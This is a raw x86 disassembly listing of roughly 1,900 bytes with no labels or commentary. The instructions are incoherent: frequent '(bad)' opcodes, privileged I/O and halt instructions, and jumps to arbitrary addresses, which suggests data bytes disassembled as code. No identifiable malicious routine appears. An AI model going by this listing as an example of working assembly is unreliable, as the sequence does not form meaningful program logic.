  43c23b:	call   0x7c42:0x49646d5a
  43c242:	cmp    al,0xd5
  43c244:	mov    edi,0x2d79a8ad
  43c249:	aad    0xcc
  43c24b:	aam    0xbd
  43c24d:	imul   eax,DWORD PTR [ebp+0x1f075c46],0x27
  43c254:	pushw  0xfffc
  43c257:	js     0x43c24b
  43c259:	or     al,0x8d
  43c25b:	jmp    0x1e30aabc
  43c260:	fwait
  43c261:	mov    bl,BYTE PTR [ebp+0x14]
  43c264:	cmp    al,0x7b
  43c266:	push   cs
  43c267:	sub    BYTE PTR [ebx-0x5bdf9f02],ch
  43c26d:	push   cs
  43c26e:	(bad)  
  43c270:	bound  ecx,QWORD PTR [ebx-0x569c96d5]
  43c276:	pop    es
  43c277:	or     ebp,ebp
  43c279:	dec    eax
  43c27a:	(bad)  
  43c27b:	push   esi
  43c27c:	jle    0x43c282
  43c27e:	es ret 0x25b1
  43c282:	cmp    DWORD PTR [ecx+0x5e],esp
  43c285:	xor    bh,BYTE PTR [edi]
  43c287:	imul   ebp,DWORD PTR [eax+edx*4+0x16],0xd9ea4426
  43c28f:	inc    edi
  43c290:	loopne 0x43c2e6
  43c292:	and    ecx,DWORD PTR [ecx+edi*8-0x5]
  43c296:	ja     0x43c2d1
  43c298:	dec    dh
  43c29a:	add    dl,BYTE PTR [esi+0x64aa4681]
  43c2a0:	into   
  43c2a1:	addr16 pop ebp
  43c2a3:	xchg   ebx,edi
  43c2a5:	ret    0x3a2a
  43c2a8:	fstp   QWORD PTR [edi]
  43c2aa:	stc    
  43c2ab:	push   edi
  43c2ac:	mov    ebp,0xb8b9dcb7
  43c2b1:	retf   
  43c2b2:	imul   edx,DWORD PTR [ecx+0x1f],0x21e651d0
  43c2b9:	pushf  
  43c2ba:	hlt    
  43c2bb:	and    dl,cl
  43c2bd:	fdiv   QWORD PTR [ecx-0x282e3006]
  43c2c3:	out    dx,eax
  43c2c4:	mov    esi,0x8bcff407
  43c2c9:	cdq    
  43c2ca:	lahf   
  43c2cb:	dec    ebx
  43c2cc:	sbb    al,0x39
  43c2ce:	jecxz  0x43c2ff
  43c2d0:	inc    ebp
  43c2d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c2d2:	shl    BYTE PTR [ebx],cl
  43c2d4:	push   edi
  43c2d5:	jge    0x43c26e
  43c2d7:	push   esp
  43c2d8:	add    BYTE PTR [eax+0x5b0df618],0xc7
  43c2df:	icebp  
  43c2e0:	nop
  43c2e1:	add    DWORD PTR [eax-0x64],ebx
  43c2e4:	xlat   BYTE PTR ds:[ebx]
  43c2e5:	repz add BYTE PTR [ebp-0x75ceb27e],bl
  43c2ec:	jb     0x43c351
  43c2ee:	mov    cs,WORD PTR [ebx]
  43c2f0:	popf   
  43c2f1:	pop    ds
  43c2f2:	add    eax,0x25d8dfd0
  43c2f7:	pop    ds
  43c2f8:	jbe    0x43c368
  43c2fa:	dec    eax
  43c2fb:	add    al,0xe2
  43c2fd:	je     0x43c35b
  43c2ff:	jb     0x43c298
  43c301:	mov    esp,DWORD PTR [ebx-0x50]
  43c304:	push   edi
  43c305:	push   eax
  43c306:	mov    esi,0x3a1d850f
  43c30b:	push   edx
  43c30c:	cmp    bl,dh
  43c30e:	pop    ebx
  43c30f:	rcr    DWORD PTR [edi+0x1b],cl
  43c312:	pop    ebx
  43c314:	(bad)  
  43c315:	push   es
  43c316:	fwait
  43c317:	add    DWORD PTR [edi],0x9
  43c31a:	and    eax,0x7cfe8fe4
  43c31f:	outs   dx,DWORD PTR ds:[esi]
  43c320:	std    
  43c321:	lds    ecx,FWORD PTR [ebx+0x3c]
  43c324:	nop
  43c325:	jmp    edi
  43c327:	lods   al,BYTE PTR ds:[esi]
  43c328:	push   esi
  43c329:	scas   al,BYTE PTR es:[edi]
  43c32a:	push   edi
  43c32b:	adc    DWORD PTR [ecx+0x5521622],esp
  43c331:	sbb    al,0xa2
  43c333:	sub    al,0x4c
  43c335:	cld    
  43c336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c337:	cmp    ebp,DWORD PTR [esp+edx*1-0x62d373d9]
  43c33e:	aam    0xc8
  43c340:	fdiv   QWORD PTR [ebx-0x4d]
  43c343:	pop    esi
  43c344:	adc    DWORD PTR [edi+eax*4],edi
  43c347:	data16 in al,dx
  43c349:	pop    DWORD PTR [edi-0x2b]
  43c34c:	and    DWORD PTR [eax-0x2ad4421c],ebp
  43c352:	das    
  43c353:	rcl    dl,0x5c
  43c356:	sbb    eax,0x9b5399b3
  43c35b:	sbb    edx,DWORD PTR [edx+edx*1-0x1d1bdcd9]
  43c362:	scas   al,BYTE PTR es:[edi]
  43c363:	sbb    ecx,DWORD PTR [edx+0x69e2957a]
  43c369:	lahf   
  43c36a:	aam    0xe1
  43c36c:	imul   edi,DWORD PTR [ebx-0x64761c0e],0x4f
  43c373:	mov    ecx,0xc74b8bf3
  43c378:	and    al,0xa6
  43c37a:	aaa    
  43c37b:	xchg   edx,eax
  43c37c:	daa    
  43c37d:	or     DWORD PTR ss:[ebx-0x25],esp
  43c381:	int    0x1b
  43c383:	sbb    BYTE PTR [ebp+0x1df6149c],cl
  43c389:	push   ecx
  43c38a:	in     eax,dx
  43c38b:	ds lock push es
  43c38e:	jno    0x43c37e
  43c390:	popa   
  43c391:	add    ch,ch
  43c393:	and    eax,0xa03c5d77
  43c398:	cs push ss
  43c39a:	shl    DWORD PTR [ecx],1
  43c39c:	mov    dl,0x9f
  43c39e:	jmp    0x43c400
  43c3a0:	ss or  edi,eax
  43c3a3:	retf   0xc586
  43c3a6:	fild   WORD PTR [edi+0x1]
  43c3a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c3aa:	js     0x43c381
  43c3ac:	stos   DWORD PTR es:[edi],eax
  43c3ad:	cmp    eax,0x9e606761
  43c3b2:	inc    ebp
  43c3b3:	or     BYTE PTR [eax+0x38],bh
  43c3b6:	push   esp
  43c3b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c3b8:	ss pop esp
  43c3ba:	or     al,0x86
  43c3bc:	call   0xb730d040
  43c3c1:	dec    eax
  43c3c2:	xchg   BYTE PTR [eax-0x6d4870ea],bl
  43c3c8:	lods   al,BYTE PTR ds:[esi]
  43c3c9:	popa   
  43c3ca:	jmp    0x43c3ce
  43c3cc:	cmp    eax,0x84f5c586
  43c3d1:	call   0x2ef2:0x16b35249
  43c3d8:	mov    cl,0x4e
  43c3db:	pop    esi
  43c3dc:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  43c3de:	mov    ds:0xce1a2cc0,eax
  43c3e3:	push   ebx
  43c3e4:	call   0xe2f7:0x9fd85274
  43c3eb:	add    ch,BYTE PTR [edi]
  43c3ed:	lock xchg DWORD PTR [esi+0x3b1448ed],eax
  43c3f4:	xchg   edi,eax
  43c3f5:	cmc    
  43c3f6:	test   ebp,ebx
  43c3f8:	dec    esi
  43c3f9:	ret    
  43c3fa:	(bad)  
  43c3fd:	out    0x2f,eax
  43c3ff:	sub    al,0xd8
  43c401:	(bad)  
  43c403:	xadd   DWORD PTR [esi],edi
  43c406:	xor    DWORD PTR [esi+0x47],ebx
  43c409:	lahf   
  43c40a:	aad    0x61
  43c40c:	adc    DWORD PTR [eax+0x6b],ebp
  43c40f:	ja     0x43c3e3
  43c411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c412:	out    dx,al
  43c413:	retf   
  43c414:	popf   
  43c415:	enter  0x586b,0x1
  43c419:	bound  edx,QWORD PTR [ecx+0x323f4c03]
  43c41f:	ret    0xce64
  43c422:	inc    ebx
  43c423:	popf   
  43c424:	or     eax,0x1a520386
  43c429:	sub    ah,bl
  43c42b:	sub    DWORD PTR [ecx+0x57b08672],0x6e
  43c432:	dec    edi
  43c433:	mov    dh,0x2b
  43c435:	fcmovbe st,st(7)
  43c437:	inc    eax
  43c438:	imul   eax,DWORD PTR ds:0xeb921393,0xffffffcd
  43c43f:	loope  0x43c4ba
  43c441:	fwait
  43c442:	push   0xffffff9f
  43c444:	js     0x43c3f3
  43c446:	fwait
  43c447:	mov    ebp,0x936a258b
  43c44c:	ror    BYTE PTR [ecx-0x9],cl
  43c44f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c450:	ficomp DWORD PTR [edi]
  43c452:	sar    DWORD PTR [edi-0x30],1
  43c455:	add    DWORD PTR [esi+0x217d596f],ebp
  43c45b:	sbb    esp,DWORD PTR [eax+edx*4]
  43c45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c45f:	nop
  43c460:	jbe    0x43c41f
  43c462:	dec    esi
  43c463:	inc    eax
  43c464:	cwde   
  43c465:	xchg   DWORD PTR [edx],ebp
  43c467:	mov    ds:0x33ebe21,eax
  43c46c:	adc    ebx,DWORD PTR [esi-0x23ee3492]
  43c472:	push   eax
  43c473:	repz mov eax,0x8101e56d
  43c479:	aam    0x1d
  43c47b:	test   BYTE PTR [ebx+esi*8+0x1b9c0c54],dl
  43c482:	push   ds
  43c483:	adc    eax,0xfa972630
  43c488:	inc    esp
  43c489:	ret    
  43c48a:	and    al,ch
  43c48c:	jns    0x43c4cc
  43c48e:	sub    ecx,ebp
  43c490:	dec    edx
  43c491:	int    0x16
  43c493:	xlat   BYTE PTR ds:[ebx]
  43c494:	sbb    cl,BYTE PTR ds:0x9a525554
  43c49a:	xchg   ecx,eax
  43c49b:	or     eax,0xf2da840d
  43c4a0:	stos   DWORD PTR es:[edi],eax
  43c4a1:	sub    bh,BYTE PTR ds:0x4e2c3f73
  43c4a7:	inc    edi
  43c4a8:	cld    
  43c4a9:	sub    DWORD PTR ds:0x29aed215,ebx
  43c4af:	mov    edi,0x57ea2d18
  43c4b4:	sbb    ch,cl
  43c4b6:	mov    bh,0x81
  43c4b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c4b9:	out    dx,al
  43c4ba:	(bad)  
  43c4bb:	and    DWORD PTR ds:0xd4ab51a2,edi
  43c4c1:	test   BYTE PTR [ecx],cl
  43c4c3:	sbb    dh,BYTE PTR [esi]
  43c4c5:	cmp    esp,DWORD PTR [edx]
  43c4c7:	sbb    edi,ebp
  43c4c9:	je     0x43c4de
  43c4cb:	xchg   esi,eax
  43c4cc:	inc    edx
  43c4cd:	aad    0x78
  43c4cf:	sub    edi,ebx
  43c4d1:	rcr    DWORD PTR [eax-0x6f],0x7c
  43c4d5:	repnz fistp WORD PTR [ecx-0x57]
  43c4d9:	in     eax,0x3d
  43c4db:	push   ecx
  43c4dc:	mov    ebx,0x7439d52d
  43c4e1:	add    ah,ah
  43c4e3:	xchg   ax,ax
  43c4e5:	pop    esi
  43c4e6:	sahf   
  43c4e7:	jge    0x43c4f6
  43c4e9:	jbe    0x43c510
  43c4eb:	mov    BYTE PTR [ebx+0x5bf7c097],dl
  43c4f1:	(bad)  
  43c4f2:	enter  0x897c,0xa3
  43c4f6:	call   0x3f569573
  43c4fb:	int    0x49
  43c4fd:	sub    ebp,edi
  43c4ff:	(bad)  
  43c500:	fsubr  DWORD PTR [esi+0x1782af28]
  43c506:	adc    esp,DWORD PTR [ecx-0x2461a4f5]
  43c50c:	jb     0x43c50d
  43c50e:	or     esi,0xffffffe5
  43c511:	int3   
  43c512:	push   es
  43c513:	gs repnz inc edi
  43c516:	or     al,0xc0
  43c518:	mov    eax,0x1b7fd1a1
  43c51d:	imul   eax,DWORD PTR [ebx-0x787a7749],0xffffffda
  43c524:	push   ecx
  43c525:	icebp  
  43c526:	and    eax,0xc120331b
  43c52b:	pop    edx
  43c52c:	xchg   ecx,eax
  43c52d:	xchg   BYTE PTR [ecx],bl
  43c52f:	retf   0xa18
  43c532:	int3   
  43c533:	cmp    BYTE PTR [edi],0xf7
  43c536:	sbb    al,BYTE PTR [ecx+0x7d]
  43c539:	test   BYTE PTR [ecx+0x39c05207],ah
  43c53f:	sbb    DWORD PTR [eax-0x62],eax
  43c542:	inc    esp
  43c543:	rcr    edx,cl
  43c545:	jnp    0x43c5b3
  43c547:	mov    esp,0x2ead8b46
  43c54c:	mov    ecx,0x6e8ba5ab
  43c551:	xchg   ebp,eax
  43c552:	cld    
  43c553:	(bad)  
  43c554:	push   esp
  43c555:	iret   
  43c556:	pushf  
  43c557:	or     dl,bl
  43c559:	and    esi,edi
  43c55b:	test   al,0xbe
  43c55d:	js     0x43c530
  43c55f:	out    0x13,eax
  43c561:	cmp    ebp,edx
  43c563:	dec    edx
  43c564:	mov    dh,0xda
  43c566:	outs   dx,DWORD PTR es:[esi]
  43c568:	add    dh,dl
  43c56a:	xchg   edi,eax
  43c56b:	and    edi,DWORD PTR [edx-0x7a0c0972]
  43c571:	(bad)  
  43c572:	(bad)  
  43c573:	outs   dx,DWORD PTR ds:[esi]
  43c574:	xor    DWORD PTR [eax-0x2b],eax
  43c577:	push   ss
  43c578:	jg     0x43c5cc
  43c57a:	lds    ebx,FWORD PTR [esi+esi*2+0x186d95d8]
  43c581:	jecxz  0x43c5a7
  43c583:	out    0x9c,eax
  43c585:	dec    ebp
  43c586:	(bad)  
  43c587:	dec    edx
  43c588:	retf   0xe84d
  43c58b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c58c:	sbb    DWORD PTR [ecx+eiz*1],0x6e
  43c590:	inc    esp
  43c591:	call   0xff1d0c54
  43c596:	std    
  43c597:	xchg   ecx,eax
  43c598:	pop    esi
  43c599:	leave  
  43c59a:	and    bl,ch
  43c59c:	sub    eax,0xe1a78d4b
  43c5a1:	cs inc esp
  43c5a3:	xchg   ebx,eax
  43c5a4:	frndint 
  43c5a6:	adc    BYTE PTR ds:0xf90ee353,bh
  43c5ac:	rcr    BYTE PTR [ebp-0x454ad65f],0xba
  43c5b3:	ret    
  43c5b4:	lds    ebp,FWORD PTR [ebx]
  43c5b6:	push   ebx
  43c5b7:	or     al,0xfb
  43c5b9:	mov    ebp,0x14716bc2
  43c5be:	dec    ecx
  43c5bf:	leave  
  43c5c0:	nop
  43c5c1:	dec    ebx
  43c5c2:	sbb    edi,0xffffffc6
  43c5c5:	je     0x43c5b4
  43c5c7:	mov    DWORD PTR ds:0xeec2d98d,edi
  43c5cd:	out    dx,eax
  43c5ce:	cdq    
  43c5cf:	mov    bh,0x7d
  43c5d1:	fwait
  43c5d2:	repnz add BYTE PTR [edi-0x19],dl
  43c5d6:	ja     0x43c61d
  43c5d8:	ds jo  0x43c5a8
  43c5db:	into   
  43c5dc:	test   eax,0xe3108426
  43c5e1:	cmp    ecx,edx
  43c5e3:	push   ss
  43c5e4:	fndisi(8087 only) 
  43c5e6:	push   0xfe20ee06
  43c5eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c5ec:	es mov dl,0xb6
  43c5ef:	jae    0x43c63a
  43c5f1:	jmp    0xe719c705
  43c5f6:	ins    BYTE PTR es:[edi],dx
  43c5f7:	clc    
  43c5f8:	ins    DWORD PTR es:[edi],dx
  43c5f9:	jno    0x43c61d
  43c5fb:	inc    edi
  43c5fc:	in     al,0xa6
  43c5fe:	(bad)  
  43c5ff:	ins    DWORD PTR es:[edi],dx
  43c600:	aam    0xa2
  43c602:	jmp    0x74dbc345
  43c607:	movsx  ebx,WORD PTR [ecx+edi*4]
  43c60b:	jp     0x43c650
  43c60d:	dec    ecx
  43c60e:	xchg   edx,eax
  43c60f:	mov    BYTE PTR [ebp-0x7336a252],dh
  43c615:	jno    0x43c5e7
  43c617:	push   esi
  43c618:	pusha  
  43c619:	fst    QWORD PTR [ecx+0x22]
  43c61c:	jl     0x43c613
  43c61e:	int    0xe5
  43c620:	xor    BYTE PTR [edx-0x3e164476],0xdd
  43c627:	and    bh,ah
  43c629:	pop    edi
  43c62a:	push   edx
  43c62b:	into   
  43c62c:	mov    ds:0xe599197,al
  43c631:	daa    
  43c632:	sbb    eax,0x788bdd1c
  43c637:	mov    eax,ss
  43c639:	inc    esi
  43c63a:	inc    esi
  43c63b:	lds    esi,FWORD PTR [ebx-0x1028c600]
  43c641:	and    eax,0x6a6f4516
  43c646:	cld    
  43c647:	cs ret 0x3114
  43c64b:	push   edi
  43c64c:	sbb    eax,0x6c3f7180
  43c651:	rol    DWORD PTR ds:[eax+esi*1-0x461a1b21],0x81
  43c65a:	push   edi
  43c65b:	call   0x301667f0
  43c660:	into   
  43c661:	retf   0x2992
  43c664:	daa    
  43c665:	repz popf 
  43c667:	cdq    
  43c668:	ins    DWORD PTR es:[di],dx
  43c66a:	add    bl,BYTE PTR [edx]
  43c66c:	out    dx,al
  43c66d:	pop    eax
  43c66e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c66f:	sbb    BYTE PTR [ecx-0x33f578b],bh
  43c675:	sbb    BYTE PTR [ebx],0x7d
  43c678:	rcl    bl,cl
  43c67a:	cwde   
  43c67b:	out    0x25,al
  43c67d:	aad    0xd4
  43c67f:	pop    eax
  43c680:	or     dh,cl
  43c682:	add    eax,0x3e4de808
  43c687:	sub    BYTE PTR [edi-0xc],0x5
  43c68b:	outs   dx,BYTE PTR ds:[esi]
  43c68c:	(bad)  
  43c68d:	fisubr DWORD PTR [ecx-0x19b0b59c]
  43c693:	push   ebp
  43c694:	and    BYTE PTR [edx-0x2c],bh
  43c697:	or     cl,BYTE PTR [edx-0x27e244d0]
  43c69d:	cld    
  43c69e:	dec    ebp
  43c69f:	mov    ah,0xec
  43c6a1:	ins    BYTE PTR es:[edi],dx
  43c6a2:	and    al,0x8f
  43c6a4:	loopne 0x43c6b1
  43c6a6:	fild   DWORD PTR [eax-0x4039cb25]
  43c6ac:	retf   
  43c6ad:	in     al,0xd7
  43c6af:	mov    al,ds:0xb5b89055
  43c6b4:	cmp    eax,0x810ad10b
  43c6b9:	repz xor al,0xbf
  43c6bc:	shl    DWORD PTR [edx-0x2],0x66
  43c6c0:	jge    0x43c651
  43c6c2:	mov    esp,0x68f0e15b
  43c6c7:	pop    esp
  43c6c8:	jae    0x43c6f0
  43c6ca:	imul   edx,edi,0x4aefec21
  43c6d0:	pop    esi
  43c6d1:	aas    
  43c6d2:	mov    dh,0x3c
  43c6d4:	mov    dh,0xc4
  43c6d6:	xchg   ebx,eax
  43c6d7:	adc    DWORD PTR [ebx+0x52],edi
  43c6da:	loope  0x43c6af
  43c6dc:	xchg   ecx,eax
  43c6dd:	leave  
  43c6de:	loopne 0x43c6f4
  43c6e0:	sbb    BYTE PTR [esi-0xd],al
  43c6e3:	and    DWORD PTR [ebx+esi*2-0x76],0xffffffbd
  43c6e8:	and    DWORD PTR [ecx+edx*4-0x2925a3b3],ebx
  43c6ef:	stos   DWORD PTR es:[edi],eax
  43c6f0:	and    al,0x33
  43c6f2:	xor    dh,ah
  43c6f4:	les    esp,FWORD PTR [eax-0x3bd8d243]
  43c6fa:	mov    bl,BYTE PTR [ecx+0x18]
  43c6fd:	xchg   esp,eax
  43c6fe:	sbb    eax,DWORD PTR [edi+0x9]
  43c701:	je     0x43c77c
  43c703:	pushf  
  43c704:	xor    bh,BYTE PTR [ecx]
  43c706:	xchg   BYTE PTR [edi+eiz*8-0x43134958],ah
  43c70d:	mov    al,0xbd
  43c70f:	jnp    0x43c6b7
  43c711:	push   cs
  43c712:	cmp    bh,0xcf
  43c715:	inc    edx
  43c716:	outs   dx,BYTE PTR ds:[esi]
  43c717:	adc    DWORD PTR [edx],0xe9df5c94
  43c71d:	daa    
  43c71e:	inc    esi
  43c71f:	dec    eax
  43c720:	mov    dx,0x7217
  43c724:	fild   WORD PTR [eax+0x21]
  43c727:	int    0xaa
  43c729:	mov    ds:0x1f096ae9,eax
  43c72e:	inc    ebx
  43c72f:	fstp   DWORD PTR [eax+0x2f4887f3]
  43c735:	cwde   
  43c736:	lea    ecx,[edx-0x1f]
  43c739:	pop    eax
  43c73a:	div    DWORD PTR [ebp+0x86c0aad]
  43c740:	inc    edi
  43c741:	fidiv  WORD PTR [ebp+0x6e]
  43c744:	mov    BYTE PTR [eax],dh
  43c746:	inc    ebp
  43c747:	loope  0x43c782
  43c749:	dec    edi
  43c74a:	and    eax,DWORD PTR ds:0xa35ff705
  43c750:	and    BYTE PTR [ebx+0x67eab276],al
  43c756:	mov    ds,WORD PTR [ebx*4-0x7edcbc04]
  43c75d:	cld    
  43c75e:	js     0x43c730
  43c760:	icebp  
  43c761:	mov    al,ds:0x80528edc
  43c766:	ins    DWORD PTR es:[edi],dx
  43c767:	cs stos DWORD PTR es:[edi],eax
  43c769:	(bad)  
  43c76a:	call   0xbcc52e75
  43c76f:	mov    bh,BYTE PTR ds:0x31f12036
  43c775:	popa   
  43c776:	sub    eax,0x6ff1dd54
  43c77b:	sub    DWORD PTR [eax-0x57],edx
  43c77e:	test   al,0x62
  43c780:	or     eax,0xf40a9d8b
  43c785:	shr    DWORD PTR [ebx],cl
  43c787:	or     BYTE PTR [edx],al
  43c789:	sub    al,0xa4
  43c78b:	leave  
  43c78c:	dec    edx
  43c78d:	dec    ebp
  43c78e:	pop    ds
  43c78f:	in     al,dx
  43c790:	jmp    0x6e4c550e
  43c795:	gs mov edi,0x14dc2e6
  43c79b:	test   eax,0x67e49389
  43c7a0:	adc    cl,bh
  43c7a2:	dec    eax
  43c7a3:	mov    eax,0x1e20cf39
  43c7a8:	(bad)  
  43c7a9:	jg     0x43c802
  43c7ab:	test   BYTE PTR [ecx+eiz*8+0x3b],cl
  43c7af:	(bad)  
  43c7b1:	mov    eax,0xdfa8ac1d
  43c7b6:	push   ebp
  43c7b7:	ds out 0x14,eax
  43c7ba:	test   al,0x13
  43c7bc:	push   ebx
  43c7bd:	lods   eax,DWORD PTR ds:[esi]
  43c7be:	or     ebx,DWORD PTR [ecx+0x5]
  43c7c1:	enter  0xc158,0xa0
  43c7c5:	fimul  WORD PTR [edi-0x729b38fe]
  43c7cb:	push   0x873574dc
  43c7d0:	out    0x2,eax
  43c7d2:	lea    edx,[esi+0x5f163db1]
  43c7d8:	pushf  
  43c7d9:	jno    0x43c7c1
  43c7db:	cmp    BYTE PTR [ebp-0x60],bl
  43c7de:	repz mov ds:0xd677108f,eax
  43c7e4:	jmp    DWORD PTR [ebx+0xf]
  43c7e7:	cwde   
  43c7e8:	ss (bad) 
  43c7eb:	jae    0x43c7c2
  43c7ed:	and    BYTE PTR [edx+edi*1],0xb9
  43c7f1:	ror    BYTE PTR [edi+ecx*2+0x2c],0xa
  43c7f6:	mov    esi,0xac26cdf9
  43c7fb:	cmp    esi,ecx
  43c7fd:	xor    DWORD PTR [edx-0x2f],ebp
  43c800:	inc    esp
  43c801:	scas   al,BYTE PTR es:[edi]
  43c802:	cli    
  43c803:	imul   esp,DWORD PTR [ecx],0x23b450fc
  43c809:	repz inc esi
  43c80b:	ret    
  43c80c:	mov    cl,0xe1
  43c80e:	adc    DWORD PTR ds:[edi*8-0x4ad68b41],ebp
  43c816:	dec    eax
  43c817:	push   ds
  43c818:	das    
  43c819:	sub    eax,0xe773b05b
  43c81e:	pop    esp
  43c81f:	ja     0x43c806
  43c821:	aam    0xe8
  43c823:	retf   
  43c824:	cmp    esp,DWORD PTR [edi-0x6e630a22]
  43c82a:	rcr    DWORD PTR [esi],cl
  43c82c:	push   ds
  43c82d:	das    
  43c82e:	test   DWORD PTR [esi-0x1e],esi
  43c831:	addr16 cmc 
  43c833:	call   0xf68e:0xa93e2e0d
  43c83a:	(bad)  
  43c83b:	inc    eax
  43c83c:	push   esi
  43c83d:	mov    esi,0xc928a951
  43c842:	inc    sp
  43c844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c845:	mov    ebp,0x22fb07f0
  43c84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c84b:	retf   
  43c84c:	loope  0x43c7fa
  43c84e:	xlat   BYTE PTR ds:[ebx]
  43c84f:	das    
  43c850:	into   
  43c851:	or     eax,0x982dc95c
  43c856:	icebp  
  43c857:	fisubr WORD PTR [ebp+0x17ad1afb]
  43c85d:	pop    es
  43c85e:	mov    esi,0x9ea92cd6
  43c863:	mov    esi,0xb38c5a28
  43c868:	in     al,dx
  43c869:	pop    eax
  43c86a:	dec    ebp
  43c86b:	xchg   edi,eax
  43c86c:	inc    edx
  43c86d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c86e:	dec    esi
  43c86f:	ret    0xfbb3
  43c872:	test   DWORD PTR [eax],edi
  43c874:	out    0x83,al
  43c876:	lods   al,BYTE PTR ds:[esi]
  43c877:	loope  0x43c82c
  43c879:	sbb    DWORD PTR [esi+0x1ae72aa2],ebp
  43c87f:	sahf   
  43c880:	fnstcw WORD PTR ds:0x415bc52d
  43c886:	xor    eax,0xe51f0cd3
  43c88b:	push   edi
  43c88c:	test   al,0xc5
  43c88e:	inc    edx
  43c88f:	scas   al,BYTE PTR es:[edi]
  43c890:	or     DWORD PTR [edx],edi
  43c892:	inc    dl
  43c894:	es jl  0x43c873
  43c897:	cmp    DWORD PTR [ecx+0x21655480],0x21509385
  43c8a1:	jne    0x43c900
  43c8a3:	lods   al,BYTE PTR ds:[esi]
  43c8a4:	(bad)  
  43c8a5:	xchg   esi,eax
  43c8a6:	imul   ebx,DWORD PTR [ecx-0x3a7ce36e],0xffffffee
  43c8ad:	fldenv [ebx+0x3eb18a25]
  43c8b3:	lods   al,BYTE PTR ds:[esi]
  43c8b4:	ins    DWORD PTR es:[edi],dx
  43c8b5:	inc    ecx
  43c8b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c8b7:	cmp    BYTE PTR [edx-0x1c],ah
  43c8ba:	repz clc 
  43c8bc:	xor    eax,0x1529b9a9
  43c8c1:	jbe    0x43c908
  43c8c3:	mov    ecx,0x59c7419c
  43c8c8:	pop    esi
  43c8c9:	arpl   sp,dx
  43c8cb:	rcr    DWORD PTR [edx+0x2ace6615],cl
  43c8d1:	stos   BYTE PTR es:[edi],al
  43c8d2:	and    al,0x95
  43c8d4:	pop    edi
  43c8d5:	hlt    
  43c8d6:	mov    esp,0xbf75dd69
  43c8db:	mov    al,0x22
  43c8dd:	inc    ecx
  43c8de:	sahf   
  43c8df:	or     edi,DWORD PTR [ebp-0x3c]
  43c8e2:	mov    ah,0xfe
  43c8e4:	dec    esp
  43c8e5:	test   DWORD PTR [ebx+0x2a05cbec],esi
  43c8eb:	mov    ebx,0x297eddbb
  43c8f0:	jno    0x43c8ec
  43c8f2:	pop    esi
  43c8f3:	out    0xc2,al
  43c8f5:	jg     0x43c8c3
  43c8f7:	push   ecx
  43c8f8:	sbb    esp,DWORD PTR [edi]
  43c8fa:	xchg   ebp,eax
  43c8fb:	(bad)  [edi]
  43c8fd:	push   eax
  43c8fe:	jmp    0xba2715a5
  43c903:	lds    eax,FWORD PTR [edi-0x48]
  43c906:	jecxz  0x43c90c
  43c908:	add    al,0xa3
  43c90a:	inc    edx
  43c90b:	push   ds
  43c90c:	mov    al,0xe0
  43c90e:	repnz iret 
  43c910:	(bad)  
  43c911:	jg     0x43c930
  43c913:	and    al,0xb4
  43c915:	lds    ebp,FWORD PTR [edx-0x71d1668f]
  43c91b:	out    dx,al
  43c91c:	sub    DWORD PTR [ecx+0x18],ebp
  43c91f:	xchg   ebp,eax
  43c920:	push   edi
  43c921:	mov    ds:0x3e33bbbb,eax
  43c926:	lods   eax,DWORD PTR ds:[esi]
  43c927:	enter  0x2134,0xe8
  43c92b:	pushf  
  43c92c:	out    dx,eax
  43c92d:	in     al,0x8f
  43c92f:	cdq    
  43c930:	aad    0x97
  43c932:	inc    di
  43c934:	fidivr WORD PTR [edx+eiz*8+0x32ea7b96]
  43c93b:	inc    ecx
  43c93c:	and    ebp,edi
  43c93e:	fsubp  st(0),st
  43c940:	mov    bl,0xe
  43c942:	or     BYTE PTR [edx+0x27870109],dl
  43c948:	dec    esp
  43c949:	je     0x43c969
  43c94b:	jmp    0x43c98d
  43c94d:	addr16 push ds
  43c94f:	fdivr  DWORD PTR [esi+0x73]
  43c952:	int    0x21
  43c954:	in     eax,dx
  43c955:	(bad)  
  43c957:	xor    BYTE PTR [ebx+0x2de6569],ch
  43c95d:	frstor [edx+0x6a]
  43c960:	rcl    DWORD PTR [ebp-0x68],cl
  43c963:	jnp    0x43c94c
  43c965:	push   ss
  43c966:	add    edx,edx
  43c968:	xchg   BYTE PTR [ebx],cl
  43c96a:	xor    BYTE PTR [ecx+esi*1+0x7ed5e581],bh
  43c971:	fisub  WORD PTR [ebp-0x7b]
  43c974:	outs   dx,BYTE PTR ds:[esi]
  43c975:	inc    ebx
  43c976:	sub    eax,eax
  43c978:	stos   DWORD PTR es:[edi],eax
  43c979:	cmp    ebx,edi
  43c97b:	aam    0x80
  43c97d:	or     eax,0xe3a5bc0f
  43c982:	dec    ebp
  43c983:	out    dx,al
  43c984:	retf   
  43c985:	sbb    ax,0x3f20
  43c989:	mov    ds:0x604f3da9,eax
  43c98e:	pop    eax
  43c98f:	inc    edi
  43c990:	leave  
  43c991:	mov    al,0xc2
  43c993:	push   edi
  43c994:	lahf   
  43c995:	mov    al,BYTE PTR [ecx-0x7d]
  43c998:	sbb    eax,0x8003ada2
  43c99d:	mov    esi,0x812cf732
  43c9a2:	add    dl,BYTE PTR [ebp+0x17af36ee]
  43c9a8:	push   cs
  43c9a9:	mov    es,WORD PTR [edx-0x33b62fdc]
  43c9af:	iret   
  43c9b0:	fistp  WORD PTR [ebp+edx*8+0x5f8990c6]
  43c9b7:	repz inc edx
  43c9b9:	ins    DWORD PTR es:[edi],dx
  43c9ba:	mov    dl,0xdf
  43c9bc:	retf   
  43c9bd:	cs das 
  43c9bf:	or     BYTE PTR [edi],al
  43c9c1:	out    dx,eax
  43c9c2:	push   edi
  43c9c3:	dec    ecx
